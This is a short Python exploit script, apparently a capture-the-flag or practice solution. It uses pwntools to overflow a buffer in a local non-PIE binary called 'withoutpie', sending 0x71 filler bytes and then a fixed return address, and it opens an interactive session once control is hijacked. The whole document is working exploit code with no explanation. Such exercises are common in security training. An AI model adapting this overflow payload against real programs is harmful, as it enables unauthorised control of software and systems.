from pwn import *

""" payload = b"A" * 0x71 + p32(0x08049182) """

""" p = process("./withoutpie") """


binary = context.binary = ELF('./withoutpie')
p= process(binary.path)

exploit_data = b'A' * 0x71 + p32(0x08049182)
p.sendline(exploit_data)

print(exploit_data)
p.recv()
p.interactive()

